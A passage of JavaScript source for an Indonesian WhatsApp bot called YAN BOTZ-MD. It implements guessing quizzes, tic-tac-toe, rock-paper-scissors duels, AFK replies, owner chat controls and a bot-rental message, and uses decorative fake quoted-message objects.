                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else repjo('*Jawaban Salah!*')
        }

        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    repjo({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await jobotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await jobotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }
const lori ={
 key: { 
  fromMe: false, 
 participant: `0@s.whatsapp.net`, 
 ...({ remoteJid: "" })
},
  message: { 
"orderMessage": {
"orderId": "5287265358017580",//Dan kode ini jangan di ubh sedikit pun 
"thumbnail": virgam, 
"itemCount": 2025,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "FIXED BY YAN BOTZ-MD CASE MD",
"message":"😈⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃",
"sellerJid": "5491133536405@s.whatsapp.net",
"token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
"totalAmount1000": "IDR 99.99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}
}
        const troli = {
            key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" })
            },
            message: { 
                "orderMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                    "mimetype": "image/jpeg",
                    "itemCount": 999999999999,
                    "message": `SHIELD-BOT`,
                    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                    "fileLength": "28777",
                    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                    "mediaKeyTimestamp": "1610993486",
                    "thumbnail": virgam,
                }
            }
        }
const shieldid = fs.readFileSync('./src/gambar/jo.jpg')
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "YAN BOTZ-MD",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": virgam,
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    jobotz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    jobotz.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) jobotz.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) jobotz.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) jobotz.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    jobotz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    repjo(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) jobotz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    repjo(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) jobotz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    jobotz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
repjo(`

Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
repjo(`
Hello Saya YAN BOTZ-MD${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	    
        switch(command) {
	    case 'yuhu': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                repjo(`${m.pushName} My Name YAN BOTZ-MD${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
repjo(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break

        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            repjo('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await jobotz.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await jobotz.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            repjo('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            jobotz.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            repjo(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            repjo('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) repjo(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return repjo(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return repjo(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await jobotz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) jobotz.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
	    if (!isCreator) return
                jobotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via E-Walet 1 Month\n│➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6288292024190 (Owner)\n\nDonate For Me : \n\n│➳ Paypal : https://www.paypal.me/Cakhaho\n│➳ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
            }
            break

case 'sc': {
scnya =`
████████████████████
██░░░░╔╦╗╦─╦╔╗░░░░██
██░░░░─║─╠═╣╠─░░░░██
██░░░░─╩─╩─╩╚╝░░░░██
██░░░░░░─╦╔╗░░░░░░██
██░░░░░░─║║║░░░░░░██
██░░░░░░╚╝╚╝░░░░░░██
██░░░░─╦╗╔╗╔╦╗░░░░██
██░░░░─║╣║║─║─░░░░██
██░░░░─╩╝╚╝─╩─░░░░██
████████████████████
╭━━━━╼⃟݊⃟̥⃝̇݊݊⃟⭕️𝐏𝐑𝐈𝐕𝐀𝐓𝐄⭕️ ݊⃟̥⃝̇݊⃟━━━━╮
┃ ╭━─━─━─≪✠≫─━─━─━╮
┃ ┃ ╭┈────────────╮
┃ ┃ │ ݊⃟̥⃝̇݊⃟╾•🎗𝐒𝐂𝐑𝐈𝐏𝐓_𝐁𝐎𝐓🎗•╼⃟݊⃟̥⃝̇݊݊⃟   
┃ ┃ ╰┈────────────╯
┃ ╰━─━─━─≪✠≫─━─━─━╯
┣━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟━•⊰᯽
┃╭━━━━━━━━━━━━━━╾╮
┃┃   ݊⃟̥⃝̇݊⃟╾•💢️𝐒𝐔𝐁𝐒𝐂𝐑𝐈𝐁𝐄💢️•╼⃟݊⃟̥⃝̇݊݊⃟   
┃╰━━━━━━━━━━━━━━╾╯
┃╭━━━━━━━━━━━━━━━╮
┃│᭄⃟ꪶ⃟•╾ 𝐘𝐎𝐔𝐓𝐔𝐁𝐄
┃│᭄⃟ꪶ⃟•╾ 𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓
┃│᭄⃟ꪶ⃟•╾ https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w
┃╰━━━━━━━━━━━━━━━╯
╰━━╼⃟݊⃟̥⃝̇݊݊⃟᯽⃟⃘⃰〘𝚈̲̅𝙰̲̅𝙽̲̅𝙱̲̅𝙾̲̅𝚃̲̅𝚉̲̅:̲̅𝙼̲̅𝙳̲̅〙⃟⃘⃰᯽ ݊⃟̥⃝̇݊⃟╾━━╯
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

© ⏤͜͡★𝐘𝐀𝐍 𝐁𝐎𝐓𝐙-𝐌𝐃

 ♡ ㅤ    ❍ㅤ        ⎙ㅤ        ⌲
ᴸⁱᵏᵉ   ᶜᵒᵐᵐᵉⁿᵗ   ᵈᵒʷⁿˡᵒᵃᵈ     ˢʰᵃʳᵉ`
jobotz.sendMessage(m.chat, {image: thumb,  
"contextInfo": {
"externalAdReply": {
"title": wm,
"body":`SCRIPT DISINI BROTHER`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": thumb
}}, caption: scnya }, {quoted: fkonjo, contextInfo:{}})
            }
            break

case 'anj': case 'ajg': case 'anjing': case 'memek': case 'kntl': case 'ngentot': case 'babi': case 'gblk': case 'goblok': case 'tolol': {
repjo('Jangan Toxic Om')
jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/vn/dosa pantek.mp3'), mimetype: 'audio/mpeg', ptt:true }, {quoted: fkonjo})
   }
   break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    jobotz.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    jobotz.chatModify({ mute: null }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    jobotz.chatModify({  archive: true }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    jobotz.chatModify({ archive: false }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'read') {
                    jobotz.chatModify({ markRead: true }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    jobotz.chatModify({ markRead: false }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    jobotz.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => repjo(jsonformat(res))).catch((err) => repjo(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    repjo('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await jobotz.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            repjo(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await jobotz.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    jobotz.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    jobotz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, jobotz.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                jobotz.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    repjo("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, jawab, jobotz.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
